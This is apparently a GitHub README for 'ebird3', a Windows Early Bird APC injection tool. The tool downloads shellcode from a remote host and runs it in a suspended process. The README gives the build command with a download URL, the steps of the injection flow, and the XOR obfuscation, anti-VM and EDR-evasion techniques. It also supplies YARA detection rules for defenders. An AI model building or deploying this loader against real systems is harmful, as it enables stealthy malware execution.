# ebird3 – Advanced Early Bird APC Injection Tool

[![License: GPL v3](https://img.shields.io/badge/License-GPLv3-blue.svg)](https://www.gnu.org/licenses/gpl-3.0)
[![Python](https://img.shields.io/badge/python-3670A0?style=for-the-badge&logo=python&logoColor=ffdd54)](https://www.python.org)
[![Shell Script](https://img.shields.io/badge/shell_script-%23121011.svg?style=for-the-badge&logo=gnu-bash&logoColor=white)](https://www.gnu.org/software/bash/)
[![ko-fi](https://ko-fi.com/img/githubbutton_sm.svg)](https://ko-fi.com/Y8Y2Z73AV)

---

- **GitHub Repository:** [https://github.com/grisuno/ebird3](https://github.com/grisuno/ebird3)
- **License:** GNU General Public License v3.0 (GPLv3)
- **Author:** grisuno
- **Target Platform:** Windows (x64)
- **Purpose:** Academic research and red teaming exercises

> ⚠️ **This project is released under GPLv3. See the [DISCLAIMER](#-disclaimer---no-warranty-or-liability) section for full legal terms.**

---

## 🔍 Overview

`ebird3` is a sophisticated **Early Bird APC injection** tool designed to **download and execute shellcode** in a suspended legitimate Windows process using **undocumented NT API calls** (`NtAllocateVirtualMemory`, `NtWriteVirtualMemory`, `NtQueueApcThread`) and **asynchronous procedure calls (APC)**. It leverages **string obfuscation**, **anti-analysis techniques**, and **manual WinSock HTTP downloading** to evade basic detection mechanisms.

This tool is intended **exclusively for academic and ethical penetration testing purposes**.

---

## 🛠️ Technical Details

### 🔧 Core Features

| Feature | Description |
|--------|-------------|
| **Early Bird APC Injection** | Injects shellcode into a newly created, suspended process before it starts executing, bypassing user-mode hooks. |
| **NT Native API Usage** | Uses `Nt*` functions from `ntdll.dll` instead of common Win32 APIs to evade EDR userland hooks. |
| **String Obfuscation** | All sensitive strings (URL, process path, User-Agent) are XOR-encoded with a user-defined key. |
| **Dynamic Shellcode Download** | Fetches shellcode via raw HTTP(S) request from a remote server. Shellcode must be in `\xNN` format. |
| **Anti-Analysis** | Detects VM environments (VMware, VirtualBox, QEMU, Xen) via registry checks and exits if detected. |
| **Manual HTTP Client** | Implements a minimal HTTP 1.1 client using WinSock to avoid `WinINet`/`WinHTTP` detection. |
| **Stackless Compilation** | Compiled with `-fno-stack-protector` and optimized for size (`-Os`) to reduce footprint. |

---

## 📦 Build Process

The `gen_ebird3.sh` script generates:
- `ebird2.c`: The main implant source code with embedded obfuscated configuration.
- `Makefile`: Cross-compilation rules using MinGW-w64.

### Build Requirements

```bash
sudo apt install mingw-w64
```
### Build
```bash
./gen_ebird3.sh \
  --target windows \
  --url "http://192.168.1.100/shellcode.bin" \
  --process-name "C:/Windows/System32/calc.exe" \
  --key 0x33
```
> ✅ Output: ebird2.exe — a fully self-contained Windows executable.

## 🧩 Code Architecture
1. String Obfuscation
All strings are XOR-encoded at compile time using a user-provided key (default: 0x33):

```c
unsigned char OBF_SHELLCODE_URL[] = { 0x12, 0x34, ... };
```

Decoded at runtime via:

```c
void xor_string(char* data, size_t len, char key) {
    for (int i = 0; i < len; i++) data[i] ^= key;
}
```

2. Shellcode Download & Extraction

- Parses HTTP response body.
- Extracts shellcode in \xNN\xNN... format.
- Applies XOR decryption using the same key.
- Enforces size limit: 2 MB by default.

3. Process Injection Flow

```c
1. Create target process (e.g., calc.exe) in SUSPENDED state
2. Resolve NtAllocateVirtualMemory → Allocate RWX memory
3. Resolve NtWriteVirtualMemory → Write shellcode
4. Resolve NtQueueApcThread → Queue APC to remote thread
5. Resume thread → APC executes shellcode
```

4. Anti-Analysis Checks
Checks BIOS version string in registry:


```text
HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\SystemBiosVersion
```
Exits if any of the following substrings are found:

- VMWARE
- VBOX
- QEMU
- XEN

## 🔍 Detection Signatures (For Blue Teams)
### 🧫 YARA Rule Suggestions
Basic IOC: Obfuscated Strings + NT API Imports

```yara
rule ebird3_EarlyBird_APC {
    meta:
        author = "LazyOwn BlueTeam Analyst"
        description = "Detects ebird3 Early Bird APC injector"
        reference = "https://github.com/grisuno/ebird3"
        license = "GPLv3"

    strings:
        $xord_url = { 68 ?? ?? ?? ?? 68 ?? ?? ?? ?? e8 ?? ?? ?? ?? 83 c4 08 } // XOR loop pattern
        $ntdll_imports = "ntdll.dll" ascii wide
        $nt_funcs[4] = (
            "NtAllocateVirtualMemory"
            "NtWriteVirtualMemory"
            "NtQueueApcThread"
            "NtClose"
        )
        $create_suspended = { 6A 04 6A 00 6A 00 6A 00 6A 00 6A 00 } // CREATE_SUSPENDED flag
        $http_get = "GET /" ascii wide
        $user_agent = "Mozilla/5.0 (Windows NT 10.0;" ascii wide

    condition:
        all of ($nt_funcs) and $ntdll_imports and $create_suspended and
        ($http_get or $user_agent) and $xord_url
}
```
Heuristic: Suspicious Memory Allocation + APC
```yara
rule ebird3_NtQueueApcThread_Heuristic {
    meta:
        author = "EDR Team"
        description = "Detects use of NtQueueApcThread for shellcode execution"

    strings:
        $apc_call = /call.*GetProcAddress.*NtQueueApcThread/
        $alloc_exec = "MEM_COMMIT | MEM_RESERVE" fullword
        $page_exec_rw = "PAGE_EXECUTE_READWRITE" fullword

    condition:
        $apc_call and $alloc_exec and $page_exec_rw
}
```

## 🛡️ Evasion Techniques
- NT API Calls
- Bypasses userland API hooks from EDRs
- No WinINet/WinHTTP
- Avoids common HTTP beaconing detection
- XOR Obfuscation
- Hides C2 URL and process name
- Anti-VM
- Prevents analysis in sandboxed environments
- Small Binary Size
- Harder to analyze statically
- APC Injection
- Executes before main thread starts (early bird)

## ⚠️ DISCLAIMER - NO WARRANTY OR LIABILITY
THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE. 

## 🎓 Educational Purpose
This project is intended to:

Help security researchers understand APC injection and NT API abuse.
Assist blue teams in developing better detection rules.
Promote awareness of living-off-the-land techniques.


![Python](https://img.shields.io/badge/python-3670A0?style=for-the-badge&logo=python&logoColor=ffdd54) ![Shell Script](https://img.shields.io/badge/shell_script-%23121011.svg?style=for-the-badge&logo=gnu-bash&logoColor=white) ![Flask](https://img.shields.io/badge/flask-%23000.svg?style=for-the-badge&logo=flask&logoColor=white) [![License: GPL v3](https://img.shields.io/badge/License-GPLv3-blue.svg)](https://www.gnu.org/licenses/gpl-3.0)

[![ko-fi](https://ko-fi.com/img/githubbutton_sm.svg)](https://ko-fi.com/Y8Y2Z73AV)
